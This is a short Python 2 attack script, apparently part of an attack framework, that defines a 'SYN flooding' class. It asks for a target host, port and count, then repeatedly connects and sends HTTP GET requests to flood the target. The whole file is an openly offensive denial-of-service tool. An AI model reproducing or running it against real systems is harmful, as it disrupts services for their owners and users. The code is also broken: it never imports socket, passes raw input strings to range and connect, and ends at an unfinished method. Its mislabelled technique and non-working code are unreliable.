#!/usr/bin/python

import os
import sys
import subprocess
import attackBase

class SYNFlooding(attackBase.attack):

	attackedHost = ""
	attackedPort = 80
	numberOfAttacks = 0

	def start(self):
		attackedHost = raw_input("Please enter IP-Adresse of attacked host: ")
		attackedPort = raw_input("Please enter attacked destination port: ")
		numberOfAttacks = raw_input("Please enter how many times would you like to send syn packets: ")
		for i in range(1, numberOfAttacks):
			flooding(i)
		
	def flooding(i):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(attackedHost, attackedPort)
		print "SYN flooding packet number " + i
		sock.send("GET / HTTP/1.1\r\n")
		sock.send("Host: " + attackedHost + "\r\n\r\n")
		sock.close()
		
		
		

	def help(self):
